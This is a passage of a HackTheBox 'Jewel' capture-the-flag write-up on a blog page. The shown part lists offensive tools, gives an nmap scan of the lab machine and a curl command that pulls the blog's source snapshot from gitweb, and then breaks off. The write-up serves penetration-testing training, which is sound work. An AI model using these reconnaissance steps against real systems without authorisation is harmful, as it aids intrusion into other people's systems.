<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-writeups docs-doc-id-HackTheBox/Jewel/write-up">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.4.1">
<title data-rh="true">Jewel | CyFun</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://s4ch.github.io/img/cydesk.png"><meta data-rh="true" name="twitter:image" content="https://s4ch.github.io/img/cydesk.png"><meta data-rh="true" property="og:url" content="https://s4ch.github.io/writeups/HackTheBox/Jewel/write-up/"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="robots" content="max-image-preview:large"><meta data-rh="true" name="monetization" content="$ilp.uphold.com/fYPB8Pjyig3z"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" property="og:title" content="Jewel | CyFun"><meta data-rh="true" name="description" content="- Name: Jewel"><meta data-rh="true" property="og:description" content="- Name: Jewel"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://s4ch.github.io/writeups/HackTheBox/Jewel/write-up/"><link data-rh="true" rel="alternate" href="https://s4ch.github.io/writeups/HackTheBox/Jewel/write-up/" hreflang="en"><link data-rh="true" rel="alternate" href="https://s4ch.github.io/writeups/HackTheBox/Jewel/write-up/" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="CyFun RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="CyFun Atom Feed">
<link rel="alternate" type="application/json" href="/blog/feed.json" title="CyFun JSON Feed">



<link rel="icon" href="/img/cy.png">
<link rel="manifest" href="/manifest.json">
<meta name="theme-color" content="rgb(37, 194, 160)">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#000">
<link rel="apple-touch-icon" href="/img/cy.png">
<link rel="mask-icon" href="/img/cy.png" color="rgb(62, 204, 94)">
<meta name="msapplication-TileImage" content="/img/cy.png">
<meta name="msapplication-TileColor" content="#000"><link rel="stylesheet" href="/assets/css/styles.ff01972a.css">
<link rel="preload" href="/assets/js/runtime~main.3415e7ae.js" as="script">
<link rel="preload" href="/assets/js/main.c90fa39a.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}return t}()||function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"dark")}()</script><div id="__docusaurus">
<div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/cy.png" alt="Logo" class="themedImage_ToTc themedImage--light_HNdA"><img src="/img/cy.png" alt="Logo" class="themedImage_ToTc themedImage--dark_i4oU"></div><b class="navbar__title text--truncate">CyFun</b></a><a class="navbar__item navbar__link" href="/blog/">Blog</a><a class="navbar__item navbar__link" href="/docs/">Threads</a><a class="navbar__item navbar__link" href="/ctf/">CTF</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/writeups/">Writeups</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/s4ch/s4ch.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently dark mode)" aria-label="Switch between dark and light mode (currently dark mode)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_ZlJk"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0 docsWrapper_BCFX"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docPage__5DB"><aside class="theme-doc-sidebar-container docSidebarContainer_b6E3"><div class="sidebarViewport_Xe31"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/writeups/">About</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" href="/writeups/HackTheBox/Academy/write-up/">HackTheBox</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Academy/write-up/">Academy</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Admirer/write-up/">Admirer</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Blackfield/write-up/">Blackfield</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Blunder/write-up/">Blunder</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Book/write-up/">Book</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Buff/write-up/">Buff</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Cache/write-up/">Cache</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Control/write-up/">Control</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/CyberSantaCTF/2021/write-up/">CyberSantaCTF</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Delivery/write-up/">Delivery</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Doctor/write-up/">Doctor</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Dyplesher/write-up/">Dyplesher</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Fatty/write-up/">Fatty</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ForwardSlash/write-up/">ForwardSlash</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" tabindex="0" href="/writeups/HackTheBox/Jewel/write-up/">Jewel</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/writeups/HackTheBox/Jewel/write-up/">Jewel </a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Laboratory/write-up/">Laboratory</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Magic/write-up/">Magic</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Mango/write-up/">Mango</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Monteverde/write-up/">Monteverde</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Nest/write-up/">Nest</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Obscurity/write-up/">Obscurity</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Omni/write-up/">Omni</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Oouch/write-up/">Oouch</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/OpenAdmin/write-up/">OpenAdmin</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Passage/write-up/">Passage</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Ready/write-up/">Ready</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Remote/write-up/">Remote</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ScriptKiddie/write-up/">ScriptKiddie</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ServMon/write-up/">ServMon</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/SneakyMailer/write-up/">SneakyMailer</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Tabby/write-up/">Tabby</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Tenet/write-up/">Tenet</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Traceback/write-up/">Traceback</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Travel/write-up/">Travel</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Traverxec/write-up/">Traverxec</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Worker/write-up/">Worker</a></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/writeups/Tryhackme/0day/">Tryhackme</a></div></li></ul></nav><button type="button" title="Collapse sidebar" aria-label="Collapse sidebar" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_gTbr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">HackTheBox</span><meta itemprop="position" content="1"></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Jewel</span><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Jewel </span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><h1>Information</h1><ul><li><strong>Name:</strong> Jewel</li><li><strong>Profile:</strong> <a href="https://www.hackthebox.eu/home/machines/profile/282" target="_blank" rel="noopener noreferrer">www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Medium</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 30</li></ul><p><img loading="lazy" alt="Jewel" src="/assets/images/jewel-ac05d1858fc10231aa8b5bb53e12ecea.png" width="598" height="381" class="img_ev3q"></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="overview">Overview<a href="#overview" class="hash-link" aria-label="Direct link to Overview" title="Direct link to Overview">​</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ sudo pacman -S nmap oath-toolkit rlwrap pwncat gtfoblookup</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="network-enumeration">Network enumeration<a href="#network-enumeration" class="hash-link" aria-label="Direct link to Network enumeration" title="Direct link to Network enumeration">​</a></h2><p>Port and service scan with nmap:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Nmap 7.91 scan initiated Wed Feb 17 19:56:48 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.10.211</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap scan report for 10.10.10.211</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host is up (0.030s latency).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Not shown: 65532 filtered ports</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PORT     STATE SERVICE VERSION</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ssh-hostkey:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   2048 fd:80:8b:0c:73:93:d6:30:dc:ec:83:55:7c:9f:5d:12 (RSA)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   256 61:99:05:76:54:07:92:ef:ee:34:cf:b7:3e:8a:05:c6 (ECDSA)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  256 7c:6d:39:ca:e7:e8:9c:53:65:f7:e2:7e:c7:17:2d:c3 (ED25519)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">8000/tcp open  http    Apache httpd 2.4.38</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-generator: gitweb/2.20.1 git/2.20.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| http-methods:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  Supported Methods: GET HEAD POST OPTIONS</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| http-open-proxy: Potentially OPEN proxy.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_Methods supported:CONNECTION</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-server-header: Apache/2.4.38 (Debian)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| http-title: 10.10.10.211 Git</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_Requested resource was http://10.10.10.211:8000/gitweb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">8080/tcp open  http    nginx 1.14.2 (Phusion Passenger 6.0.6)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| http-methods:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  Supported Methods: GET HEAD POST OPTIONS</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-server-header: nginx/1.14.2 + Phusion Passenger 6.0.6</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-title: BL0G!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service Info: Host: jewel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Read data files from: /usr/bin/../share/nmap</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Nmap done at Wed Feb 17 19:58:46 2021 -- 1 IP address (1 host up) scanned in 118.32 seconds</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We have gitweb/2.20.1 on port 8000 and Phusion Passenger 6.0.6 on port 8080.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="web-discovery">Web discovery<a href="#web-discovery" class="hash-link" aria-label="Direct link to Web discovery" title="Direct link to Web discovery">​</a></h2><p>On gitweb we can browse to the summary of the only repository which is
hosting the source code of the blog and download a snapshot of it.</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ curl --output blog.tar.gz -J -L &#x27;http://10.10.10.211:8000/gitweb/?p=.git;a=snapshot;h=5d6f436256c9575fbc7b1fb9621b18f0f8656741;sf=tgz&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ tar xaf blog.tar.gz</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cd .git-5d6f436</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 